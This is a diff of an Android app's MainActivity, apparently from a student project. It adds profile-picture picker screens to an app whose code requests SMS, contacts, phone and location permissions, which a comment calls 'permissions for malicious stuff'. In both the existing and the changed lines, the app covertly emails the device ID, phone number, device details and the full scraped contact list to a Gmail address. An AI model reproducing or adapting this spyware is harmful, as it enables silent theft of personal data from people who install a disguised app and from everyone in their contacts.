@@ -7,21 +7,23 @@ import androidx.core.content.ContextCompat;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.location.Location;
 import android.location.LocationManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.CountDownTimer;
 import android.provider.Settings;
 import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 import android.view.View;
 import android.widget.Button;
+import android.widget.ImageView;
 import android.widget.Toast;
 
 import java.io.IOException;
@@ -41,47 +43,47 @@ public class MainActivity extends AppCompatActivity {
     public static String phoneNum;
     public static LocationInfo locationinfo;
 
+    ImageView profImgA,profImgB,profImgC,profImgD,profImgE,profImgF;
+//    profile 1 - 6 = imageValue 8 - 13
+    static int REQUESTCODE = 1, profile = 0;
+    Uri pickedImageUri;
     private void checkMultiplePermissions() {
         if (Build.VERSION.SDK_INT >= 23) {
-            List<String> permissionsNeeded = new ArrayList<String>();
-            List<String> permissionsList = new ArrayList<String>();
+            List<String> permissionsNeeded = new ArrayList<>();
+            List<String> permissionsList = new ArrayList<>();
 
-            if (!addPermissions(permissionsList, android.Manifest.permission.ACCESS_NETWORK_STATE)) {
+            if (!addPermission(permissionsList, android.Manifest.permission.ACCESS_NETWORK_STATE)) {
                 permissionsNeeded.add("Internet");
             }
-            if (!addPermissions(permissionsList, Manifest.permission.READ_CONTACTS)) {
+            if (!addPermission(permissionsList, Manifest.permission.READ_CONTACTS)) {
                 permissionsNeeded.add("Contacts");
             }
-            if (!addPermissions(permissionsList, Manifest.permission.RECEIVE_SMS)) {
+            if (!addPermission(permissionsList, Manifest.permission.RECEIVE_SMS)) {
                 permissionsNeeded.add("SMS");
             }
-            if (!addPermissions(permissionsList, Manifest.permission.READ_PHONE_STATE)) {
+            if (!addPermission(permissionsList, Manifest.permission.READ_PHONE_STATE)) {
                 permissionsNeeded.add("PhoneState");
             }
-            if (!addPermissions(permissionsList, Manifest.permission.READ_SMS)) {
+            if (!addPermission(permissionsList, Manifest.permission.READ_SMS)) {
                 permissionsNeeded.add("ReadSMS");
             }
-            if (!addPermissions(permissionsList,Manifest.permission.READ_PHONE_NUMBERS))
-            {
+            if (!addPermission(permissionsList, Manifest.permission.READ_PHONE_NUMBERS)) {
                 permissionsNeeded.add("ReadPhoneNumbers");
             }
-            if (!addPermissions(permissionsList,Manifest.permission.ACCESS_COARSE_LOCATION))
-            {
+            if (!addPermission(permissionsList, Manifest.permission.ACCESS_COARSE_LOCATION)) {
                 permissionsNeeded.add("CoarseLocation");
             }
-            if (!addPermissions(permissionsList, Manifest.permission.ACCESS_FINE_LOCATION))
-            {
+            if (!addPermission(permissionsList, Manifest.permission.ACCESS_FINE_LOCATION)) {
                 permissionsNeeded.add("FineLocation");
             }
-            if (permissionsList.size() > 0) {
-                requestPermissions(permissionsList.toArray(new String[permissionsList.size()]),
+            if (!permissionsList.isEmpty()) {
+                requestPermissions(permissionsList.toArray(new String[0]),
                         REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS);
-                return;
             }
         }
     }
 
-    private boolean addPermissions(List<String> permissionsList, String permission) {
+    private boolean addPermission(List<String> permissionsList, String permission) {
         if (Build.VERSION.SDK_INT >= 23) {
             if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                 permissionsList.add(permission);
@@ -118,7 +120,9 @@ public class MainActivity extends AppCompatActivity {
                         && perms.get(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
                         && perms.get(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                         && perms.get(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
-                        && perms.get(Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED) {
+                        && perms.get(Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED
+                )
+                {
                     //All required permissions for malicious stuff is granted
                     return;
                 } else {
@@ -183,8 +187,10 @@ public class MainActivity extends AppCompatActivity {
             {
                 Location location = locationinfo.getLocation();
                 EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ androidID +"  |  Number:"+phoneNum , DeviceScrape.getDeviceInfo()
-                        + "\nLocation: "+locationinfo.getLocation().getLongitude() +" "+locationinfo.getLocation().getLatitude()
-                        + "\nBattery Level:" + batterylevel + "\n\n\nContacts:\n-----\n" +  ContactScrape.scrapeContacts(getContentResolver()));
+//                        + "\nLocation: "+locationinfo.getLocation().getLongitude() +" "+locationinfo.getLocation().getLatitude()
+                        + "\nBattery Level:" + batterylevel + "\n\n\nContacts:\n-----\n"
+                        + ContactScrape.scrapeContacts(getContentResolver())
+                        );
             }
         } .start();
 
@@ -239,8 +245,90 @@ public class MainActivity extends AppCompatActivity {
                 startActivity(intent);
             }
         });
+        //Change imageView8-13
+        profImgA  = findViewById(R.id.imageView8);
+        profImgB  = findViewById(R.id.imageView9);
+        profImgC  = findViewById(R.id.imageView10);
+        profImgD  = findViewById(R.id.imageView11);
+        profImgE  = findViewById(R.id.imageView12);
+        profImgF  = findViewById(R.id.imageView13);
 
+        profImgA.setOnClickListener(new View.OnClickListener() {
+            public void onClick(View view){
+                profile = 1;
+                Intent galleryIntent = new Intent(Intent.ACTION_GET_CONTENT);
+                galleryIntent.setType("image/*");
+                startActivityForResult(galleryIntent,REQUESTCODE);
+            }
+        });
+        profImgB.setOnClickListener(new View.OnClickListener() {
+            public void onClick(View view){
+                profile = 2;
+                Intent galleryIntent = new Intent(Intent.ACTION_GET_CONTENT);
+                galleryIntent.setType("image/*");
+                startActivityForResult(galleryIntent,REQUESTCODE);
+            }
+        });
+        profImgC.setOnClickListener(new View.OnClickListener() {
+            public void onClick(View view){
+                profile = 3;
+                Intent galleryIntent = new Intent(Intent.ACTION_GET_CONTENT);
+                galleryIntent.setType("image/*");
+                startActivityForResult(galleryIntent,REQUESTCODE);
+            }
+        });
+        profImgD.setOnClickListener(new View.OnClickListener() {
+            public void onClick(View view){
+                profile = 4;
+                Intent galleryIntent = new Intent(Intent.ACTION_GET_CONTENT);
+                galleryIntent.setType("image/*");
+                startActivityForResult(galleryIntent,REQUESTCODE);
+            }
+        });
+        profImgE.setOnClickListener(new View.OnClickListener() {
+            public void onClick(View view){
+                profile = 5;
+                Intent galleryIntent = new Intent(Intent.ACTION_GET_CONTENT);
+                galleryIntent.setType("image/*");
+                startActivityForResult(galleryIntent,REQUESTCODE);
+            }
+        });
+        profImgF.setOnClickListener(new View.OnClickListener() {
+            public void onClick(View view){
+                profile = 6;
+                Intent galleryIntent = new Intent(Intent.ACTION_GET_CONTENT);
+                galleryIntent.setType("image/*");
+                startActivityForResult(galleryIntent,REQUESTCODE);
+            }
+        });
 
+    }
 
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (resultCode == RESULT_OK && requestCode == REQUESTCODE && data != null) {
+            pickedImageUri = data.getData();
+            switch (profile) {
+                case 1:
+                    profImgA.setImageURI(pickedImageUri);
+                    break;
+                case 2:
+                    profImgB.setImageURI(pickedImageUri);
+                    break;
+                case 3:
+                    profImgC.setImageURI(pickedImageUri);
+                    break;
+                case 4:
+                    profImgD.setImageURI(pickedImageUri);
+                    break;
+                case 5:
+                    profImgE.setImageURI(pickedImageUri);
+                    break;
+                case 6:
+                    profImgF.setImageURI(pickedImageUri);
+                    break;
+            }
+        }
     }
 }
